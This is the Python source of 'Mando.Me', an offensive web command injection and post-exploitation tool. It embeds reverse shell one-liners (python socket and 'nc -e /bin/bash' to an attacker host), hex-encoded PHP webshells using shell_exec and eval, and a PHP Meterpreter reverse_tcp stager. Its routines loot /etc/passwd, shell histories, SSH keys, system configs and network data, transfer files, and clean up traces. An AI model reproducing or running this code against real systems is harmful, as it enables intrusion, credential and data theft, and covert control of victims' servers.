#!/usr/bin/env python3
import os
import sys
import getopt
import urllib
import urllib.request
import re
import socket
import threading
import time
import binascii
import hashlib
import math
import random
import string
import json
import base64
import zlib
import textwrap
import readline
import signal
import platform
import dateutil
import fcntl
import errno

### TODO :: Add proxy support
__author__ = "z0noxz"
_gs = {
	"_stager"				: "cmd",
	"_var_exec"				: "SMPLSHLLEXEC",
	"_var_eval"				: "SMPLSHLLEVAL",
	"_var_sudo"				: "SMPLSHLLSUDO",
	"_var_sudo_prompt"		: "SMPLSHLLSUDOPROMPT",
	
	"dir_loot"				: ".ssc/{0}/.loot/{1}/",
	"_is_sudo"				: False,
	
	"url"					: "",
	"post"					: None,
	"get"					: None,
	"cookies"				: None,
	
	"chunk_size"			: 65,
	"initial_path"			: "",
	"shell_path"			: "",
	"working_directory"		: "",
	
	"reverse_shells": [
		"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
		"nc -e /bin/bash {0} {1}",
		"/bin/nc.traditional -e /bin/bash {0} {1}",
	],
	
	"payloads": {
		"stager": {
			"path" : "", 
			"payload" : "3c3f7068702069662028697373657428245f4745545b22636d64225d2929207b206563686f207368656c6c5f6578656328245f4745545b22636d64225d293b206469653b207d203f3e"
		},
		"smplshll": {
			"path" : "",
			"payload" : "66756e6374696f6e205f637279707428246b65792c2024737472696e672c2024616374696f6e203d2022656e637279707422290a7b0a0924726573203d2022223b0a090a096966202824616374696f6e20213d3d2022656e637279707422290a097b0a090924737472696e67203d206261736536345f6465636f64652824737472696e67293b0a097d0a090a09666f7220282469203d20303b202469203c207374726c656e2824737472696e67293b2024692b2b290a097b0a09092463203d206f7264287375627374722824737472696e672c20246929293b0a09090a09096966202824616374696f6e203d3d2022656e637279707422290a09097b0a0909092463202b3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0a09090924726573202e3d2063687228246320262030784646293b0a09097d0a0909656c73650a09097b0a0909092463202d3d206f72642873756273747228246b65792c2028282469202b2031292025207374726c656e28246b6579292929293b0a09090924726573202e3d20636872286162732824632920262030784646293b0a09097d0a097d0a090a096966202824616374696f6e203d3d2022656e637279707422290a097b0a090924726573203d206261736536345f656e636f64652824726573293b0a097d0a090a0972657475726e20247265733b0a7d0a0a66756e6374696f6e2063616c6c6261636b2824627566666572290a7b0a0972657475726e20285f637279707428225f5f494e505f5053575f5f222c20246275666665722c2022656e63727970742229293b0a7d0a0a6f625f7374617274282263616c6c6261636b22293b0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f4556414c5f5f225d29290a7b0a096576616c285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f4556414c5f5f225d2c20225f5f494e505f5053575f5f2229293b0a096469653b0a7d0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f455845435f5f225d29290a7b0a096563686f207368656c6c5f65786563285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f455845435f5f225d2c20225f5f494e505f5053575f5f2229293b0a096469653b0a7d0a0a69662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f5f225d29290a7b0a09247069203d20617272617928293b0a09247072203d2070726f635f6f70656e285f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f5f225d2c20225f5f494e505f5053575f5f22292c206172726179286172726179282270697065222c20227222292c206172726179282270697065222c2022772229292c20247069293b0a090a0969662028697373657428245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f50524f4d50545f5f225d29290a097b0a0909667772697465282470697065735b305d2c205f637279707428225f5f494e505f5053575f5f222c20245f5345525645525b22485454505f5f5f494e505f5641525f5355444f5f50524f4d50545f5f225d2c20225f5f494e505f5053575f5f2229293b0a097d0a090a0966636c6f7365282470695b305d293b0a097072696e745f722873747265616d5f6765745f636f6e74656e7473282470695b315d29293b0a0970726f635f636c6f736528247072293b0a096469653b0a7d0a0a6f625f656e645f666c75736828293b"
		}
	},
	
	"meterpreter_payloads": {
		"php_meterpreter_reverse_tcp" : "6572726f725f7265706f7274696e672830293b20246970203d2022{0}223b2024706f7274203d20{1}3b2069662028282466203d202273747265616d5f736f636b65745f636c69656e7422292026262069735f63616c6c61626c652824662929207b202473203d20246628227463703a2f2f7b2469707d3a7b24706f72747d22293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d202266736f636b6f70656e22292026262069735f63616c6c61626c652824662929207b202473203d202466282469702c2024706f7274293b2024735f74797065203d202273747265616d223b207d20656c736569662028282466203d2022736f636b65745f63726561746522292026262069735f63616c6c61626c652824662929207b202473203d2024662841465f494e45542c20534f434b5f53545245414d2c20534f4c5f544350293b2024726573203d2040736f636b65745f636f6e6e6563742824732c202469702c2024706f7274293b2069662028212472657329207b2064696528293b207d2024735f74797065203d2022736f636b6574223b207d20656c7365207b2064696528226e6f20736f636b65742066756e637322293b207d206966202821247329207b2064696528226e6f20736f636b657422293b207d20737769746368202824735f7479706529207b2063617365202273747265616d223a20246c656e203d2066726561642824732c2034293b20627265616b3b20636173652022736f636b6574223a20246c656e203d20736f636b65745f726561642824732c2034293b20627265616b3b207d206966202821246c656e29207b2064696528293b207d202461203d20756e7061636b28224e6c656e222c20246c656e293b20246c656e203d2024615b226c656e225d3b202462203d2022223b207768696c6520287374726c656e28246229203c20246c656e29207b20737769746368202824735f7479706529207b2063617365202273747265616d223a202462202e3d2066726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b20636173652022736f636b6574223a202462202e3d20736f636b65745f726561642824732c20246c656e2d7374726c656e28246229293b20627265616b3b207d207d2024474c4f42414c535b226d7367736f636b225d203d2024733b2024474c4f42414c535b226d7367736f636b5f74797065225d203d2024735f747970653b206576616c282462293b2064696528293b"
	}
}

help_notes = """
  Mando.Me (Web Command Injection) 0.1
  -----------------------------
  Created by: z0noxz
  https://github.com/z0noxz/mando.me

  Usage: (python) mando.me.py [options]

  Options:
    --help                Show this help message and exit
    --url                 Shell interface URL without paramters (e.g. "http://www.site.com/simple-shell.php")
    
    --post                Declare POST data (eg. "{'submit':'','ip':_INJECT_}")
    --get                 Declare GET data (eg. "{'ip':_INJECT_}")
    --cookies             Declare COOKIE data (eg. "PHPSESSID=deadbeefdeadbeefdeadbeefdeadbeef")

    Shell commands:
      Commands that are executable while in shell interface
      
      meterpreter         Injects a PHP Meterpreter, PHP Reverse TCP Stager (requires a listener for php/meterpreter/reverse_tcp)
      upload              Upload a file
      download            Download a file
      kill_self           Cleans up traces and aborts the shell
      exit                Exits the shell
"""

def split(str, num): return [ str[start:start+num] for start in range(0, len(str), num) ]
def enum(**enums): return type("Enum", (), enums)
def enum_name(value, enum): return next((x for x in enum.__dict__.keys() if (enum.__name__ == "Enum" and not (x == "__doc__" or x == "__dict__" or x == "__weakref__") and enum.__dict__[x] == value)), "")

class Print(object):
	
	@staticmethod
	def text(text = "", continuous = False):
		if continuous:			
			sys.stdout.write("  " + text)
			sys.stdout.flush()
		else:
			print("  " + text)
		return len(text)
		
	@staticmethod
	def debug(text = ""): return Print.text("debug :: " + text)
		
	@staticmethod
	def info(text = "", continuous = False): return Print.text("\033[94m[i]\033[0m " + text, continuous)
		
	@staticmethod
	def warning(text = "", continuous = False): return Print.text("\033[96m[!]\033[0m " + text, continuous)
		
	@staticmethod
	def status(text = "", continuous = False): return Print.text("\033[94m[*]\033[0m " + text, continuous)
		
	@staticmethod
	def error(text = "", continuous = False): return Print.text("\033[91m[-]\033[0m " + text, continuous)
		
	@staticmethod
	def success(text = "", continuous = False): return Print.text("\033[92m[+]\033[0m " + text, continuous)
	
	@staticmethod
	def confirm(text = ""): 
		Print.text("\033[38;5;133m[?] " + text + " (Y/n): \033[0m", True)
		return not (input().strip()).lower() in ["n", "no"]
		
		
	@staticmethod
	def table(caption = "", description = "", headers = [], rows = {}):
		
		if len(rows) == 0:
			rows.append(dict((x, "") for x in range(0, len(headers))))
			
		max_headers = list(
			(
				max(
					max(
						map(
							len, (str(rows[i][j]) for i in range(0, len(rows)))
						)
					), len(headers[j])
				)
			) for j in range(0, len(headers))
		)
		
		hr_width = (sum(max_headers) + ((len(max_headers) - 1) * 2))
		
		if caption != "":
			Print.text(caption.center(hr_width))
			Print.text("=" * hr_width)
			
		if description != "":
			Print.text(textwrap.fill(description, width = hr_width, initial_indent = "", subsequent_indent = "  "))
			Print.text()
		
		if "".join(headers) != "":
			Print.text("  ".join(headers[i] + (" " * (max_headers[i] - len(headers[i]))) for i in range(0, len(headers))))
			Print.text("  ".join(("-" * (max_headers[i])) for i in range(0, len(headers))))
				
		for row in rows:
			Print.text("  ".join(str(row[i]) + (" " * (max_headers[i] - len(str(row[i])))) for i in range(0, len(headers))))
			
			if "list" in row.keys() and row["list"] != None:
				index = row["list"]["index"]
				array = row["list"]["array"]
				
				for item in array:
					Print.text((" " * (sum(max_headers[:index])) + index) + item)
				Print.text()
				
class Utility(object):

	os = enum (
		UNDEFINED	= 1000, 
		WINDOWS 	= 1001, 
		LINUX 		= 1002
	)
	
	@staticmethod
	def crypt(key, data, encrypt = True):
		result = bytearray()

		for i, c in enumerate(data if encrypt else base64.b64decode(data)):			
			if encrypt: 
				result.append(int(ord(c) + ord(key[((i + 1) % len(key)):][:1]) & 0xff))
			else: 
				result.append(int(abs(c - ord(key[((i + 1) % len(key)):][:1])) & 0xff))
				
		return base64.b64encode(result).decode("utf-8") if encrypt else "".join(chr(c) for c in result)
	
	@staticmethod
	def hexToStr(h):
		return bytes.fromhex(h).decode("utf-8")
	
	@staticmethod
	def strToHex(s):
		return binascii.hexlify(s.encode("utf-8")).decode("utf-8")
	
	@staticmethod
	def ip4_addresses():
		return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0]
	
	@staticmethod
	def loot_name(sufix, sub_dir = ""):
		_dir = _gs["dir_loot"]
		
		if sub_dir != "": _dir += sub_dir
		if not os.path.exists(_dir): os.makedirs(_dir)

		return _dir + time.strftime("%Y%m%d%H%M%S") + "_" + sufix

	@staticmethod
	def save_loot(file_name, loot, sub_dir = ""):	
		file_name = Utility.loot_name(file_name, sub_dir)
		with open(file_name, "w") as file:
			file.write(loot)
			Print.success("Loot saved at " + file_name)
	
	@staticmethod
	def check_working_directory(working_directory, new_directory):		
		new_directory = new_directory if not new_directory == "" else working_directory
		
		if (re.match("^(/[^/ ]*)+/?$", new_directory)):
			if (PHPInteractor.command("if test -d " + new_directory + "; then \"1\"; fi") == ""):
				return new_directory
		
		return working_directory
	
	@staticmethod
	def filesize(size):
		for unit in ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB"]:
			if abs(size) < 1024.0:
				return "%3.1f %s" % (size, unit)
			size /= 1024.0
		return "%.1f%s%s" % (size, 'Yi', suffix)

	@staticmethod
	def self_or_sudo(command):
		if _gs["_is_sudo"]:
			return PHPInteractor.sudo_command("sudo " + command)
		else:
			return PHPInteractor.command(command)

	@staticmethod
	def dist_name():
		return PHPInteractor.command("lsb_release -si").strip().lower()
	
	@staticmethod
	def get_os(interactor = None):
		_system = platform.system() # Gets local platform
		
		if interactor != None:
			if interactor("uname -s").strip().lower() in ["sunos", "aix", "linux"]: _system = "linux"
			elif "windows" in interactor("ver").strip().lower(): _system = "windows"
			else: _system = "undefined"
	
		return next((Utility.os.__dict__[x] for x in Utility.os.__dict__.keys() if (x.lower() == _system.lower())), Utility.os.UNDEFINED)
		
class PHPInteractor(object):
	global _gs		
	
	@staticmethod
	def send(url, headers, timeout):
		request = urllib.request.Request(url)
		data = ""
		
		# Add password key
		request.add_header(_gs["smplshll_main_password_var"], _gs["smplshll_main_password"])
					
		for header in headers.keys():
			request.add_header(header, Utility.crypt(_gs["smplshll_input_password"], headers[header]))
		
		if timeout > 0:
			data = urllib.request.urlopen(request, timeout = timeout).read()
		else:
			data = urllib.request.urlopen(request).read()

		return Utility.crypt(_gs["smplshll_input_password"], data, False) if _gs["smplshll_response_encryption"] else data
	
	@staticmethod
	def command(cmd, timeout = 0):
		return PHPInteractor.send(_gs["url_exec"], {_gs["_var_exec"]: cmd}, timeout)
	
	@staticmethod
	def sudo_command(cmd, timeout = 0):
		return PHPInteractor.send(_gs["url_exec"], {_gs["_var_sudo"]: cmd}, timeout)
	
	@staticmethod
	def sudo_command_prompt(cmd, prompt, timeout = 0):
		return PHPInteractor.send(_gs["url_exec"], {_gs["_var_sudo"]: cmd, _gs["_var_sudo_prompt"]: prompt}, timeout)
	
	@staticmethod
	def eval(cmd, timeout = 0):
		return PHPInteractor.send(_gs["url_exec"], {_gs["_var_eval"]: cmd}, timeout)
			
class MandoCommand(object):
	global _gs
	
	@staticmethod
	def separator():
		
		if _gs["system"] == Utility.os.LINUX: 
			return "/"
		elif _gs["system"] == Utility.os.WINDOWS: 
			return "\\"
		else:
			return ""

	@staticmethod
	def mc_sudo(match):
		if _gs["_is_sudo"]:
			result = PHPInteractor.sudo_command("sudo " + match.group(1))
			if result.strip() != "":
				for x in result.strip().split("\n"): Print.text(x)
			else:
				Print.info("No output")
		else:
			Print.error(PHPInteractor.command("whoami").strip() + " is not a compatible sudoer")
			Print.info("The user must be a sudoer and have the option 'ALL=(ALL) NOPASSWD: ALL'")
			Print.info("Tips: Check out the command 'enable_sudo' through the shell")		

	@staticmethod
	def mc_sessions(match):
		SessionManager.select()

	@staticmethod
	def mc_interact(match):
		session = SessionManager.select(int(match.group(1)))
		if session != None: session.interact()
		
	@staticmethod
	def mc_meterpreter(match):

		Print.text()
		Print.info("Preparing meterpreter payload")
		payload = _gs["meterpreter_payloads"]["php_meterpreter_reverse_tcp"].format("".join("{:02x}".format(ord(c)) for c in match.group(1)), "".join("{:02x}".format(ord(c)) for c in match.group(5)))
		
		MandoCommand.mc_meterpreter_state = 0
		def injector(payload):
			try:
				PHPInteractor.eval(payload, 1)
			except:
				MandoCommand.mc_meterpreter_state = 1
				return
			
			MandoCommand.mc_meterpreter_state = -1

		Print.info("Injecting meterpreter payload through PHP evaluation")
		threading.Thread(target = injector, args = (Utility.hexToStr(payload), )).start()
		
		while True:
			if MandoCommand.mc_meterpreter_state != 0:				
				Print.success("Meterpreter injection succeeded") if MandoCommand.mc_meterpreter_state == 1 else Print.error("Meterpreter injection failed")				
				break
		
		Print.text()

	@staticmethod
	def mc_gather_user_history(match):	
		
		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
		
		Print.info("Executing as '" + user + "'")
		if user != "root": Print.warning("For best effect, this should be executed as root")
		Print.text()
		
		users = Utility.self_or_sudo("/bin/cat /etc/passwd | cut -d : -f 1").strip().split("\n")
		shells = ["ash", "bash", "csh", "ksh", "sh", "tcsh", "zsh"]
		applications = [".mysql_history", ".psql_history", ".dbshell", ".viminfo"]
		counter = 0
		
		Print.status("Retrieving history for " + str(len(users)) + " users")
		print("")

		for user in users:
			counter += 1
			Print.status("" + str(counter) + " of " + str(len(users)) + " inspecting user " + user)
			home_dir = Utility.self_or_sudo("echo ~" + user).strip()
			if Utility.self_or_sudo("[ -d " + home_dir + " ] && echo 'found' || echo 'not found'").strip() == "found":				
				Print.status("Looting home directory for " + user)
				for shell in shells:
					shell_file = home_dir + "/." + shell + "_history"
					if Utility.self_or_sudo("[ -f " + shell_file + " ] && echo 'found' || echo 'not found'").strip() == "found":
						Print.status("Extracting " + shell + " history for " + user)
						history = Utility.self_or_sudo("cat " + shell_file).strip()
						Utility.save_loot(user + ".shell_history." + shell, history, "user_history/")
				for application in applications:
					application_file = home_dir + "/" + application
					if Utility.self_or_sudo("[ -f " + application_file + " ] && echo 'found' || echo 'not found'").strip() == "found":
						Print.status("Extracting " + application + " file for " + user)
						history = Utility.self_or_sudo("cat " + application_file).strip()
						Utility.save_loot(user + ".applicaiton_history." + application_file, history, "user_history/")
			if counter < len(users):
				print("")

	@staticmethod
	def mc_gather_system_info(match):
		
		dist = Utility.dist_name()
		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
		
		Print.info("Executing as '" + user + "'")
		if user != "root": Print.warning("For best effect, this should be executed as root")
		Print.info("Identified the system to be '" + dist + "'")
		Print.text()
		
		operations = {
			"fedora,redhat,suse,mandrake,oracle,amazon": {
				"users": "/bin/cat /etc/passwd | cut -d : -f 1",
				"packages": "rpm -qa",
				"services": "/sbin/chkconfig --list",
				"disk_info": "/bin/mount -l && /bin/df -ahT",
				"logfiles": "find /var/log -type f -perm -4 2> /dev/null",
				"setuid_setgid": "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null",
			},
			"slackware": {
				"users": "/bin/cat /etc/passwd | cut -d : -f 1",
				"packages": "/bin/ls /var/log/packages",
				"services": "ls -F /etc/rc.d | /bin/grep \'*$\'",
				"disk_info": "/bin/mount -l && /bin/df -ahT",
				"logfiles": "find /var/log -type f -perm -4 2> /dev/null",
				"setuid_setgid": "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null",
			},
			"ubuntu,debian": {
				"users": "/bin/cat /etc/passwd | cut -d : -f 1",
				"packages": "/usr/bin/dpkg -l",
				"services": "/usr/sbin/service --status-all",
				"disk_info": "/bin/mount -l && /bin/df -ahT",
				"logfiles": "find /var/log -type f -perm -4 2> /dev/null",
				"setuid_setgid": "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null",
			},
			"gentoo": {
				"users": "/bin/cat /etc/passwd | cut -d : -f 1",
				"packages": "equery list",
				"services": "/bin/rc-status --all",
				"disk_info": "/bin/mount -l && /bin/df -ahT",
				"logfiles": "find /var/log -type f -perm -4 2> /dev/null",
				"setuid_setgid": "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null",
			},
			"arch": {
				"users": "/bin/cat /etc/passwd | cut -d : -f 1",
				"packages": "/usr/bin/pacman -Q",
				"services": "/bin/egrep '^DAEMONS' /etc/rc.conf",
				"disk_info": "/bin/mount -l && /bin/df -ahT",
				"logfiles": "find /var/log -type f -perm -4 2> /dev/null",
				"setuid_setgid": "find / -xdev -type f -perm +6000 -perm -1 2> /dev/null",
			},
		}
		
		for operation in operations.keys():
			if dist in operation.split(","):
				for action in operations[operation].keys():
					Utility.save_loot(dist + "." + action, Utility.self_or_sudo(operations[operation][action]).strip(), "system_info/")
				return
		
		Print.error("No operation defined for this distro")

	@staticmethod	
	def mc_gather_configs(match):	
		
		dist = Utility.dist_name()
		user = Utility.self_or_sudo("/usr/bin/whoami").strip()
		
		Print.info("Executing as '" + user + "'")
		if user != "root": Print.warning("For best effect, this should be executed as root")
		Print.text()
		
		configs = [
			"/etc/apache2/apache2.conf",
			"/etc/apache2/ports.conf",
			"/etc/nginx/nginx.conf",
			"/etc/snort/snort.conf",
			"/etc/mysql/my.cnf",
			"/etc/ufw/ufw.conf",
			"/etc/ufw/sysctl.conf",
			"/etc/security.access.conf",
			"/etc/shells",
			"/etc/security/sepermit.conf",
			"/etc/ca-certificates.conf",
			"/etc/security/access.conf",
			"/etc/gated.conf",
			"/etc/rpc",
			"/etc/psad/psad.conf",
			"/etc/mysql/debian.cnf",
			"/etc/chkrootkit.conf",
			"/etc/logrotate.conf",
			"/etc/rkhunter.conf",
			"/etc/samba/smb.conf",
			"/etc/ldap/ldap.conf",
			"/etc/openldap/openldap.conf",
			"/etc/cups/cups.conf",
			"/etc/opt/lampp/etc/httpd.conf",
			"/etc/sysctl.conf",
			"/etc/proxychains.conf",
			"/etc/cups/snmp.conf",
			"/etc/mail/sendmail.conf",
			"/etc/snmp/snmp.conf"
		]
		
		for config in configs:
			if Utility.self_or_sudo("[ -f " + config + " ] && echo 'found' || echo 'not found'").strip() == "found":
				Utility.save_loot(dist + "." + config.replace("/", "_"), Utility.self_or_sudo("cat " + config).strip(), "configs/")

	@staticmethod
	def mc_status(match = None):		
		Print.text("")
		Print.table(
			headers = ["", ""], 
			rows = list(
				[
					{
						0 : "Shell",
						1 : ": " + _gs["shell_path"]
					},
					{
						0 : "System",
						1 : ": " + PHPInteractor.command("uname -a").strip() if _gs["system"] == Utility.os.LINUX else PHPInteractor.command("ver").strip() if _gs["system"] == Utility.os.WINDOWS else ""
					},
					{
						0 : "Id",
						1 : ": " + PHPInteractor.command("id").strip()
					},
					{
						0 : "Sudo",
						1 : ": " + ("\033[92mAccess granted\033[0m" if _gs["_is_sudo"] else "\033[91mAccess denied\033[0m")
					},
					{
						0 : "Help",
						1 : ": " + "?"
					},
				]
			)
		)
		Print.text("")
		
	@staticmethod
	def mc_shell(match):
		Print.text("")
		shell = SessionManager.register(Shell(match.group(1), 0), "Reverse Shell")
		shell.open()
		if hasattr(shell, "interact"): shell.interact()
			
	@staticmethod
	def mc_pwd(match = None):
		
		wd = ""
		
		if _gs["system"] == Utility.os.LINUX: 
			wd = PHPInteractor.command("pwd").strip()
		elif _gs["system"] == Utility.os.WINDOWS: 
			wd = PHPInteractor.command("echo %cd%").strip()
			
		if match != None: Print.text(wd)		
		return wd

	@staticmethod
	def mc_ls(match = None):
		#import dateutil.parser
		
		dir = []
		Print.text()
		
		if _gs["system"] == Utility.os.LINUX: 
			wd = PHPInteractor.command("cd " + _gs["working_directory"] + " && ls").strip()
		elif _gs["system"] == Utility.os.WINDOWS:
			for o in PHPInteractor.command("echo off && cd " + _gs["working_directory"] + " && FOR /D %D IN (*) DO (echo %~aD;%~tD;;%~nD)").strip().split("\n") + PHPInteractor.command("echo off && cd " + _gs["working_directory"] + " && FOR %F IN (*) DO (echo %~aF;%~tF;%~zF;%~nxF)").strip().split("\n"):
				x = o.split(";")
				dt = parse(x[1])
				
				dir.append({
					0 : x[0],
					1 : Utility.filesize(int(x[2] if x[2] != "" else 0)).rjust(16),
					2 : "dir" if x[2] == "" else x[3][x[3].rfind(".") + 1:] if "." in x[3] else "n/a",
					3 : "{0}-{1:02}-{2:02} {3:02}:{4:02}".format(dt.year, dt.month, dt.day, dt.hour, dt.minute),
					4 : x[3]
				})
			
		Print.table(
			caption = _gs["working_directory"],
			headers = ["Attributes", "Size", "Type", "Last modified", "Name"], 
			rows = dir
		)			
		Print.text()
		
	@staticmethod
	def mc_gather_network_info(match):
		user = Utility.self_or_sudo("/usr/bin/whoami").strip()

		Print.text("")
		Print.info("Executing as '" + user + "'")
		if user != "root": Print.warning("For best effect, this should be executed as root")
		Print.info("Enumerating and collecting network data...")
		Print.text()

		def ssh_keys():
			keys = []		
			base = [m.group(0) for d in Utility.self_or_sudo("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n") for m in [re.search(r"(^\/)(.*)\.ssh$", d)] if m]

			if len(base) > 0:
				for file in Utility.self_or_sudo("/bin/ls -a " + base[0]).strip().split("\n"):
					if re.match(r"^(\.+)$", file):
						keys.append(Utility.self_or_sudo("cat " + base[0] + "/" + file))
			return "\n".join(keys)

		def arp():
			records = []
			for address in re.findall(r"((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3})\s*(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))", Utility.self_or_sudo("arp -a")):
				if not address.group(5).lower().startswith("01-00-5e"):
					records.append(address.group(1).ljust(10, " ") + Utility.self_or_sudo("nslookup " + address.group(1)).ljust(10, " ") + address.group(5).ljust(10, " ")) # TODO :: Add 
			return "\n".join(records)

		for operation, actions in {
			"nconf" 		: ["/sbin/ifconfig -a"],
			"routes" 		: ["/sbin/route -e"],
			"iptables" 		: ["/sbin/iptables -L", "/sbin/iptables -L -t nat", "/sbin/iptables -L -t mangle"],
			"resolv" 		: ["cat /etc/resolv.conf"],
			"sshd_conf" 	: ["cat /etc/ssh/sshd_config"],
			"ssh_keys" 		: [ssh_keys],
			"hosts" 		: ["cat /etc/hosts"],
			"connections" 	: ["/usr/bin/lsof -nPi"],
			"wireless" 		: ["/sbin/iwconfig"],
			"open_ports" 	: ["/bin/netstat -tulpn"],
			"updown" 		: ["ls -R /etc/network"],
			"arp"			: [arp],
		}.iteritems():
			result = "\n".join(action() if hasattr(action, "__call__") else Utility.self_or_sudo(action).strip() for action in actions)
			Utility.save_loot("network." + operation, result, "network_info/") if result != "" else Print.error(operation + " returned empty")

		Print.text("")

	@staticmethod
	def mc_file_upload(match):
		global _gs
			
		print("")
		print("  File Uploader:")
		print("  ------------------------------------------------------------------")
		print("  This program simply uploads a file to the target server")
		print("")
		
		lpath = input("  Local path: ")
		file_name = lpath[lpath.rfind("/") + 1:]
		
		sys.stdout.write("\n  Initializing..................................................")
		sys.stdout.flush()
		print("[\033[92mOK\033[0m]")
		
		try:
			with open(lpath, "rb") as f:

				counter = 1
				step = 1
				chunk_size = _gs["chunk_size"]
				progress_width = 64 - 8
				file_size = os.path.getsize(lpath)
				chunk_count = math.ceil(file_size / chunk_size)
				local_hash_md5 = hashlib.md5()

				## Setup progress bar
				sys.stdout.write("  Uploading")
				sys.stdout.flush()

				PHPInteractor.command("cd " + _gs["working_directory"] + " && rm " + file_name)
				PHPInteractor.command("cd " + _gs["working_directory"] + " && touch " + file_name)

				while True:
					chunk = f.read(chunk_size)
					local_hash_md5.update(chunk)

					if chunk:				
						chunk = binascii.hexlify(chunk).decode("utf-8")
						chunk = "0x" + "0x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])

						PHPInteractor.command("cd " + _gs["working_directory"] + " && echo '" + chunk + "' >> " + file_name)

						if ((counter / (chunk_count / progress_width)) > step):
							sys.stdout.write(".")
							sys.stdout.flush()
							step += 1
						counter += 1
					else:
						break
						
				# Remove line breaks, and last byte (0a: line break)
				PHPInteractor.command("cd " + _gs["working_directory"] + " && sed -i -- ':a;N;$!ba;s/\\n//g' " + file_name + " && truncate -s-1 " + file_name)

				sys.stdout.write("\b" * (step - 1))
				sys.stdout.flush()
				sys.stdout.write(("." * (progress_width - 3)))
				print("[\033[92mOK\033[0m]")				
				
				sys.stdout.write("  finalizing....................................................")
				sys.stdout.flush()
				
				# Replace each hex representative
				for i in range(256):
					PHPInteractor.command("cd " + _gs["working_directory"] + "&& sed -i -- 's/0x" + str("%0.2x" % i) + r"/\x" + str("%0.2x" % i) + "/g' " + file_name)

				print("[\033[92mOK\033[0m]")
				
				sys.stdout.write("  Analysing file integrity......................................")
				sys.stdout.flush()
				print("[\033[92mOK\033[0m]" if (str(PHPInteractor.command("cd " + _gs["working_directory"] + " && md5sum " + file_name + " | awk '{ print $1 }'")).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
		except:
			import traceback
			print(traceback.format_exc())
			print("\n  \033[91mError: cannot open '" + file_name + "'\033[0m")

	@staticmethod
	def mc_php_variables(match):
		print(PHPInteractor.eval("print_r(get_defined_vars());"))
			
	@staticmethod	
	def mc_php_eval(match):
		global _gs
			
		print("")
		print("  PHP Evaluator:")
		print("  ------------------------------------------------------------------")
		print("  This program evaluats PHP code")
		print("")
			
		print("  ------------------------------------------------------------------\n  " + PHPInteractor.eval(input("  PHP Code: ")))
			
	@staticmethod
	def mc_file_download(match, path = None):
		global _gs

		rpath = (path if path != None else match.group(1))
		file_name = Utility.loot_name(rpath[rpath.rfind("/") + 1:])
		
		try:
			counter = 1
			step = 1
			chunk_size = _gs["chunk_size"]
			progress_width = 64 - 10
			file_size = int(PHPInteractor.command("cd " + _gs["working_directory"] + " && stat -c%s '" + rpath + "'"))
			chunk_count = math.ceil(file_size / chunk_size)
			local_hash_md5 = hashlib.md5()
			
			if PHPInteractor.command("cd " + _gs["working_directory"] + " && [ -r '" + rpath + "' ] && echo 'granted' || 'denied'").strip() == "granted":
				
				## Setup progress bar
				sys.stdout.write("  Downloading")
				sys.stdout.flush()

				try: os.remove(file_name)
				except OSError: pass
				
				while True:
					chunk = PHPInteractor.command("cd " + _gs["working_directory"] + " && hexdump -ve '1/1 \"%.2x\"' '" + rpath + "' -n " + str(chunk_size) + " -s " + str(chunk_size * (counter - 1)))		

					if (not chunk == ""): 
						with open(file_name, "ab") as _file:
							_file.write(binascii.unhexlify(chunk))

						if ((counter / (chunk_count / progress_width)) > step):
							sys.stdout.write(".")
							sys.stdout.flush()
							step += 1
						counter += 1
					else:
						break

				sys.stdout.write("\b" * (step - 1))
				sys.stdout.flush()
				sys.stdout.write(("." * (progress_width - 3)))
				print("[\033[92mOK\033[0m]")
			
				sys.stdout.write("  Analysing file integrity......................................")
				sys.stdout.flush()	

				local_hash_md5 = hashlib.md5()
				with open(file_name, "rb") as _file:
					local_hash_md5.update(_file.read())

				print("[\033[92mOK\033[0m]" if (str(PHPInteractor.command("cd " + _gs["working_directory"] + " && md5sum " + rpath + " | awk '{ print $1 }'")).strip() == str(local_hash_md5.hexdigest()).strip()) else ".[\033[91mX\033[0m]")
				print("  Loot saved at: \033[92m" + file_name + "\033[0m")
			else:
				Print.error("Cannot access the file")
		except:
			print("\n  \033[91mError: cannot download file'" + file_name + "'\033[0m")

	@staticmethod
	def mc_dir_dump(match):
		
		_files = PHPInteractor.command("ls -p " + _gs["working_directory"] + " | grep -v /").strip().split("\n")
		counter = 0
		
		for _file in _files:
			counter += 1
			
			print("\n  \033[94mDownload file (" + str(counter) + " of " + str(len(_files)) + "): '" + _file + "'\033[0m")
			print("  ------------------------------------------------------------------")
			MandoCommand.mc_file_download(match, _file)	

	@staticmethod
	def mc_kill_self(match):
		
		print("")
		print("  Kill Self Protocol:")
		print("  ------------------------------------------------------------------")
		print("  This program cleans up traces and aborts the shell")
		print("")
		
		## Remove payloads
